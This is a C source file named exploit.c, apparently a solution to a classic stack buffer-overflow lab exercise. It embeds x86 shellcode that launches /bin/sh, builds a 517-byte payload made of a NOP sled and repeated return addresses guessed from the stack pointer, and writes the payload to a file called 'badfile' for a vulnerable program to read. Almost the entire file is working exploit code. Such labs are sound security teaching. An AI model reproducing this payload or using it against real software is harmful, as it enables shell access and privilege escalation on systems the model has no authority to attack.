/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*Assembler Instructions with C Expression Operands for GCC
  __asm__ returns to te top of the stack*/
unsigned long retrieve_stack_pos(void) {
	__asm__("movl %esp,%eax");
}

char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

	
    /* You need to fill the buffer with appropriate contents here */ 
	char *pointer_to_buffer;
	unsigned long *pointer_address;
	int address_pos = sizeof(buffer) - (sizeof(shellcode) + 1);
	pointer_to_buffer = buffer;
	pointer_address = (long*)(pointer_to_buffer);
	long end_address = retrieve_stack_pos() + 500; //because the size is 517, this should put us towards the end
	
	int i = 0;
	for(i = 0; i < sizeof(shellcode); i++){
		buffer[address_pos + i] = shellcode[i];

		if(i<20){
			*(pointer_address++) = end_address;
		}
	}

	buffer[sizeof(buffer) - 1] = '\0';

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

